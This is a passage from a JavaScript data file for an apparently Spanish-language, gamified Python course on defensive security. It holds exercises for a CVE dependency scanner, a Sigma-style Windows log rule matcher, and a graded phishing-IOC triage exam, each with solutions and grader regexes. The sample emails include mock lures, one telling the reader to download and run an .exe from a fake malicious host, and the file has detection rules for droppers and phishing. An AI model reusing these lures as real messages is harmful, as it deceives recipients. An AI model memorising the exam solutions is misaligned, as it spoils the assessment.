      'import json\nfrom collections import Counter\n\ndef parse_version(v):\n    return tuple(int(x) for x in v.split("."))\n\ndef is_vulnerable(version, rule):\n    if rule.startswith("<="):\n        return parse_version(version) <= parse_version(rule[2:])\n    if rule.startswith("<"):\n        return parse_version(version) < parse_version(rule[1:])\n    return False\n\nfindings = []\nfor line in REQUIREMENTS_TXT.strip().splitlines():\n    pkg, _, ver = line.strip().partition("==")\n    for entry in CVE_DB.get(pkg, []):\n        if is_vulnerable(ver, entry["rule"]):\n            findings.append({"package": pkg, "version": ver, "cve": entry["cve"], "severity": entry["severity"]})\n\nprint(json.dumps(findings, indent=2))\nsev = Counter(f["severity"] for f in findings)\nprint(f"critical={sev[\'critical\']} high={sev[\'high\']} medium={sev[\'medium\']} low={sev[\'low\']}")',
    strategy:
      "PASO 1 — Imports: json para serializar, Counter para resumen.\n" +
      "\n" +
      "PASO 2 — parse_version(v): convierte 'X.Y.Z' en una tupla (X, Y, Z)\n" +
      "         de enteros. Pista: split('.') da una lista de strings, hay\n" +
      "         que mapearlos a int. Comprehension + tuple() lo hacen.\n" +
      "\n" +
      "PASO 3 — is_vulnerable(version, rule): la rule es un string como\n" +
      "         '<2.0.3' o '<=3.2.4'. Detecta el operador (orden importa:\n" +
      "         primero comprueba '<=' que es más específico, luego '<').\n" +
      "         Quita el operador del string y compara las tuplas.\n" +
      "\n" +
      "PASO 4 — Itera REQUIREMENTS_TXT línea a línea (splitlines).\n" +
      "         Para cada línea: pkg, _, ver = line.strip().partition('==')\n" +
      "         (partition siempre devuelve 3 valores; usamos _ para el\n" +
      "         separador que no necesitamos).\n" +
      "\n" +
      "PASO 5 — Para cada paquete, itera sus entradas en CVE_DB. Si\n" +
      "         is_vulnerable es True, añade un dict con package, version,\n" +
      "         cve y severity a la lista findings.\n" +
      "         Truco: CVE_DB.get(pkg, []) devuelve [] si pkg no tiene\n" +
      "         entradas, evita un KeyError.\n" +
      "\n" +
      "PASO 6 — Imprime json.dumps(findings, indent=2). Después un\n" +
      "         Counter(f['severity'] for f in findings) y resumen final.",
    skeleton:
      'import json\n' +
      'from collections import Counter\n' +
      '\n' +
      'def parse_version(v):\n' +
      '    # "2.0.1" -> (2, 0, 1)\n' +
      '    return tuple([TODO: int(x) for x in v.split(...)])\n' +
      '\n' +
      'def is_vulnerable(version, rule):\n' +
      '    # OJO: comprueba primero <= (más largo) y luego <\n' +
      '    if rule.startswith("<="):\n' +
      '        return parse_version(version) [TODO: <=] parse_version(rule[2:])\n' +
      '    if rule.startswith("<"):\n' +
      '        return parse_version(version) [TODO: <]  parse_version(rule[1:])\n' +
      '    return False\n' +
      '\n' +
      'findings = []\n' +
      'for line in REQUIREMENTS_TXT.strip().splitlines():\n' +
      '    # "flask==2.0.1".partition("==") -> ("flask", "==", "2.0.1")\n' +
      '    pkg, _, ver = line.strip().[TODO: método partition con "=="]\n' +
      '\n' +
      '    for entry in CVE_DB.get(pkg, []):  # [] como default si no existe\n' +
      '        if is_vulnerable(ver, entry["rule"]):\n' +
      '            findings.append({\n' +
      '                "package": pkg,\n' +
      '                "version": ver,\n' +
      '                "cve": entry["cve"],\n' +
      '                "severity": entry["severity"],\n' +
      '            })\n' +
      '\n' +
      'print(json.dumps(findings, [TODO: indent=2]))\n' +
      'sev = Counter([TODO: f["severity"] para cada f en findings])\n' +
      'print(f"critical={sev[\'critical\']} high={sev[\'high\']} "\n' +
      '      f"medium={sev[\'medium\']} low={sev[\'low\']}")',
    starterCode:
      '# Requirements.txt del cliente (formato simplificado: pkg==version).\nREQUIREMENTS_TXT = """\nflask==2.0.1\ndjango==3.2.5\nrequests==2.25.0\npillow==8.0.0\nsqlalchemy==1.4.0\nnumpy==1.21.0\n"""\n\n# Feed de CVEs mockeado (en producción esto vendría de NVD / OSV / GHSA).\nCVE_DB = {\n    "django": [\n        {"rule": "<=3.2.4", "cve": "CVE-EDU-DJ-001", "severity": "high"},\n    ],\n    "flask": [\n        {"rule": "<2.0.3", "cve": "CVE-EDU-FL-001", "severity": "medium"},\n    ],\n    "pillow": [\n        {"rule": "<8.3.2", "cve": "CVE-EDU-PI-001", "severity": "high"},\n        {"rule": "<7.0.0", "cve": "CVE-EDU-PI-002", "severity": "critical"},\n    ],\n    "requests": [\n        {"rule": "<2.26.0", "cve": "CVE-EDU-RQ-001", "severity": "low"},\n    ],\n}\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bjson\.dumps\s*\(/, message: "Vuelca el reporte como JSON" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
      { type: 'mustContain', regex: /\bCVE_DB\b/, message: "Cruza contra CVE_DB" },
      { type: 'mustContain', regex: /\bsplit\s*\(/, message: "Usa split para parsear las versiones" },
    ],
  },

  {
    id: 55, chapter: 9,
    title: "Reglas Sigma-lite sobre logs de Windows",
    location: "SOC · stream de eventos del SIEM",
    concept: "Matcher genérico de condiciones + agregación con threshold",
    intro:
      "\"El SIEM dispara reglas Sigma sobre el stream de eventos. Tú vas a " +
      "implementar un matcher mínimo: cada regla tiene una 'condition' (dict que " +
      "el evento debe cumplir TODAS sus claves) y opcionalmente 'threshold' + " +
      "'groupby' para detectar bursts. Cubre dos patrones clásicos: bruteforce de " +
      "logon (4625 ≥ N por src_ip) y eventos críticos (1102 log cleared, 4732 " +
      "user added to admins).\"",
    outro:
      "Tres reglas funcionando sobre el stream. Esto se traduce 1-a-1 a Sigma " +
      "real cambiando la estructura del dict por YAML.",
    diary:
      "Día 55. El núcleo del matching es `all(event.get(k) == v for k,v in cond.items())`. " +
      "Tres líneas y resuelto. La parte interesante es el threshold con Counter — " +
      "cuándo lo que importa no es UN evento sino N en una ventana.",
    mission:
      "Datos: lista EVENTS (eventos de seguridad de Windows simulados, cada uno " +
      "un dict) y lista RULES (cada regla: name, condition, optional threshold + " +
      "groupby + severity).\n\n" +
      "1) Define event_matches(event, condition): True si todas las claves de " +
      "condition aparecen en event con el mismo valor.\n" +
      "2) Para cada regla:\n" +
      "   • Filtra los eventos que matchean.\n" +
      "   • Si la regla tiene 'threshold' + 'groupby': agrupa por esa clave con " +
      "Counter; dispara alerta cuando count ≥ threshold.\n" +
      "   • Si no, cada evento que matchea es una alerta directa.\n" +
      "3) Imprime cada alerta como una línea: \"[severity] rule_name — detalle\".\n" +
      "4) Al final, imprime el total: \"N alertas generadas\".",
    hint:
      'from collections import Counter\n\ndef event_matches(event, condition):\n    return all(event.get(k) == v for k, v in condition.items())\n\nalerts = 0\nfor rule in RULES:\n    matched = [e for e in EVENTS if event_matches(e, rule["condition"])]\n    sev = rule.get("severity", "medium")\n    if "threshold" in rule and "groupby" in rule:\n        counts = Counter(e[rule["groupby"]] for e in matched)\n        for key, n in counts.items():\n            if n >= rule["threshold"]:\n                alerts += 1\n                print(f"[{sev}] {rule[\'name\']} — {rule[\'groupby\']}={key} count={n}")\n    else:\n        for e in matched:\n            alerts += 1\n            print(f"[{sev}] {rule[\'name\']} — {e}")\nprint(f"{alerts} alertas generadas")',
    strategy:
      "PASO 1 — event_matches(event, condition):\n" +
      "         La función devuelve True si TODAS las claves de condition\n" +
      "         existen en event con el mismo valor.\n" +
      "         Implementación idiomática: all(event.get(k) == v for k, v\n" +
      "         in condition.items()). 'all' devuelve True si todos los\n" +
      "         elementos son truthy.\n" +
      "\n" +
      "PASO 2 — Inicializa alerts = 0.\n" +
      "\n" +
      "PASO 3 — Para cada rule en RULES:\n" +
      "         a) Filtra los eventos que matchean su condition: usa una\n" +
      "            list comprehension con event_matches.\n" +
      "         b) Lee la severity de la regla con .get('severity', 'medium')\n" +
      "            por si no está definida.\n" +
      "\n" +
      "PASO 4 — Bifurca según el tipo de regla:\n" +
      "         CASO A (threshold + groupby presentes):\n" +
      "           - Cuenta los eventos matched agrupados por la clave\n" +
      "             groupby usando Counter.\n" +
      "           - Para cada (key, count): si count >= threshold,\n" +
      "             dispara alerta y la imprime.\n" +
      "         CASO B (regla sin threshold):\n" +
      "           - Cada evento matched es alerta directa. Imprime una\n" +
      "             por cada uno.\n" +
      "\n" +
      "PASO 5 — Imprime el total de alertas al final.",
    skeleton:
      'from collections import Counter\n' +
      '\n' +
      'def event_matches(event, condition):\n' +
      '    # ¿Todas las claves de condition existen en event con mismo valor?\n' +
      '    return [TODO: all(...)] (event.get(k) == v for k, v in condition.items())\n' +
      '\n' +
      'alerts = 0\n' +
      'for rule in RULES:\n' +
      '    # Filtrar eventos que matchean la condición\n' +
      '    matched = [e for e in EVENTS if [TODO: llamada a event_matches]]\n' +
      '    sev = rule.get("severity", "medium")\n' +
      '\n' +
      '    if "threshold" in rule and "groupby" in rule:\n' +
      '        # Caso agregación: contar por la clave groupby\n' +
      '        counts = Counter(e[rule["groupby"]] for e in matched)\n' +
      '        for key, n in counts.items():\n' +
      '            if n [TODO: comparador] rule["threshold"]:\n' +
      '                alerts += 1\n' +
      '                print(f"[{sev}] {rule[\'name\']} — "\n' +
      '                      f"{rule[\'groupby\']}={key} count={n}")\n' +
      '    else:\n' +
      '        # Caso simple: cada matched es alerta\n' +
      '        for e in matched:\n' +
      '            alerts += 1\n' +
      '            print(f"[{sev}] {rule[\'name\']} — {e}")\n' +
      '\n' +
      'print(f"{alerts} alertas generadas")',
    starterCode:
      '# Stream de eventos Windows (simulado — equivalente a EventLog/SIEM).\nEVENTS = [\n    {"event_id": 4625, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 4625, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 4625, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 4625, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 4625, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 4624, "user": "alice",      "src_ip": "10.0.0.5",  "logon_type": 3},\n    {"event_id": 1102, "user": "admin",      "src_ip": "10.0.0.99"},\n    {"event_id": 4720, "user": "evil_admin", "src_ip": "10.0.0.99"},\n    {"event_id": 4732, "user": "evil_admin", "src_ip": "10.0.0.99", "group": "Administrators"},\n]\n\n# Reglas Sigma-lite (estructura: nombre, condition, threshold opcional, severity).\nRULES = [\n    {\n        "name": "failed_logon_burst",\n        "condition": {"event_id": 4625},\n        "threshold": 5, "groupby": "src_ip",\n        "severity": "high",\n    },\n    {\n        "name": "log_cleared",\n        "condition": {"event_id": 1102},\n        "severity": "critical",\n    },\n    {\n        "name": "user_added_to_admins",\n        "condition": {"event_id": 4732, "group": "Administrators"},\n        "severity": "high",\n    },\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+event_matches\b|\bdef\s+\w*matches?\w*\b/, message: "Define la función de matching" },
      { type: 'mustContain', regex: /\bCounter\b/, message: "Usa collections.Counter para el threshold" },
      { type: 'mustContain', regex: /\bRULES\b/, message: "Itera sobre RULES" },
      { type: 'mustContain', regex: /\ball\s*\(/, message: "Usa all(...) para que todas las condiciones se cumplan" },
    ],
  },

  {
    id: 56, chapter: 9,
    title: "EVALUACIÓN: pipeline de threat intel",
    location: "Sala de evaluaciones · pipeline completo de TI",
    concept: "EVALUACIÓN — encadenar IOCs, reglas y reporte JSON",
    is_exam: true,
    is_checkpoint: true,
    is_final: false,
    intro:
      "\"Pipeline completo: emails reportados → extraer IOCs → clasificar contra " +
      "reglas → reporte JSON priorizado por severidad. Sin pista.\"",
    outro:
      "Cap 9 cerrado. Tienes el bloque de detección y análisis defensivo cubierto.",
    diary:
      "Día 56. Examen 8. Lo que sale aquí es el formato real del que vive el SOC " +
      "todos los días: alerta + IOC + severity + recomendación. Esto no se " +
      "diferencia mucho del JSON que pasa entre TheHive y MISP.",
    mission:
      "Datos: lista EMAILS (id, body) y dict RULES (cada regla: name, severity, " +
      "patterns — lista de regex que deben aparecer TODOS para que matchee).\n\n" +
      "1) Define una función extract_iocs(body) que devuelva un dict " +
      "{\"urls\": [...], \"ips\": [...]} usando regex.\n" +
      "2) Define una función classify(body, rules) que devuelva la lista de " +
      "nombres de reglas que matchean (todos sus patterns presentes).\n" +
      "3) Define una función build_alert(email, rules_hit, iocs) que devuelva un " +
      "dict {id, severity (la más alta de los rules_hit), rules: [...], iocs}.\n" +
      "4) Procesa todos los EMAILS, descarta los que no matchean ninguna regla, " +
      "ordena los hits por severidad (critical > high > medium).\n" +
      "5) Imprime json.dumps(alerts, indent=2) y un resumen final.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 30 líneas\n" +
      "• Debes definir AL MENOS 3 funciones con def\n" +
      "• Debes usar import re, import json\n" +
      "• El reporte debe ser JSON con indent=2",
    hint: "Examen sin pista.",
    solution:
      'import re, json\n\nSEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}\n\ndef extract_iocs(body):\n    return {\n        "urls": re.findall(r"https?://[^\\s]+", body),\n        "ips": re.findall(r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b", body),\n    }\n\ndef classify(body, rules):\n    hits = []\n    for r in rules:\n        if all(re.search(p, body) for p in r["patterns"]):\n            hits.append(r)\n    return hits\n\ndef build_alert(email, hits, iocs):\n    severity = min((h["severity"] for h in hits), key=lambda s: SEV_ORDER[s])\n    return {"id": email["id"], "severity": severity, "rules": [h["name"] for h in hits], "iocs": iocs}\n\nalerts = []\nfor em in EMAILS:\n    hits = classify(em["body"], RULES)\n    if hits:\n        alerts.append(build_alert(em, hits, extract_iocs(em["body"])))\nalerts.sort(key=lambda a: SEV_ORDER[a["severity"]])\nprint(json.dumps(alerts, indent=2))\nprint(f"{len(alerts)}/{len(EMAILS)} emails escalados")',
    starterCode:
      '# EVALUACIÓN — Capítulo 9\n\nEMAILS = [\n    {"id": "msg_001", "body": "Pay invoice at https://acm3-corp.support/inv/1234. IP 185.220.101.45. URGENT — wire transfer NOW."},\n    {"id": "msg_002", "body": "Reset your password at https://intranet.acmecorp.com/reset"},\n    {"id": "msg_003", "body": "DOWNLOAD the attached file from http://payr0ll.io.evil-cdn.net/x.exe and run it. ASAP."},\n    {"id": "msg_004", "body": "Quarterly report attached. Regards."},\n]\n\nRULES = [\n    {"name": "wire_fraud_pattern", "severity": "high",\n     "patterns": [r"wire transfer", r"URGENT|ASAP"]},\n    {"name": "executable_dropper",  "severity": "critical",\n     "patterns": [r"\\.exe", r"https?://"]},\n    {"name": "credential_phish",    "severity": "medium",\n     "patterns": [r"reset.*password", r"https?://"]},\n]\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 30, message: "Máximo 30 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+[\s\S]*\bdef\s+\w+[\s\S]*\bdef\s+\w+/, message: "Define al menos 3 funciones con def" },
      { type: 'mustContain', regex: /\bimport\s+re\b|,\s*re\b/, message: "Importa re" },
      { type: 'mustContain', regex: /\bimport\s+json\b|,\s*json\b/, message: "Importa json" },
      { type: 'mustContain', regex: /\bjson\.dumps\s*\([^)]*indent\s*=\s*2/, message: "json.dumps con indent=2" },
    ],
  },
];
